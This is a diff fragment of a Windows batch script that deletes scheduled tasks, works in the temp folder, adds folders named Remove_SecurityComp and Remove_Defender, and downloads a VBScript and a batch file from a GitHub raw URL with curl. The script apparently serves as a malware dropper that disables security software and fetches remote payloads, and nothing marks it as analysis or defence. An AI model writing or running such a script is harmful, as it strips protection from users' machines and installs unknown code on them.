@@ -14,6 +14,10 @@ schtasks /delete /tn "upgradef1" /f
 schtasks /delete /tn "InstallRequests" /f
 schtasks /delete /tn "RunPowerShellScript" /f
 cd %temp%
+mkdir Remove_SecurityComp
+mkdir Remove_Defender
+cd Remove_Defender
+
 
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs-o e.vbs
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123.bat -o asd123.bat
